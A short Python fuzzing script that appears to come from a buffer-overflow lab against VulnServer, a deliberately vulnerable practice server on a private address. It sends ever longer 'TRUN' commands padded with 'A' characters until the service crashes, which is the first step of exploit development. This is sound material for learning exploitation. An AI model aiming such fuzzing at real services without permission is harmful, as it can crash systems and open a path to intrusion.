#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        # AF_INET = IPv4 (IP of machine running VulnServer)
        # SOCK_STREAM = PORT (default port for VulnServer = 9999)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(("192.168.10.7", 9999))

        payload = "TRUN /.:/" + buffer
        s.send(payload.encode())
        print(f"Sending payload... {str(len(buffer))}")
        print("Fuzzing TRUN...")

        sleep(1)
        buffer = buffer + "A" * 100

    except socket.error as err:
        print(f"Error: {err}")
        print(f"Fuzzing crashed at {str(len(buffer))} bytes")
        sys.exit()
    finally:
        s.close()
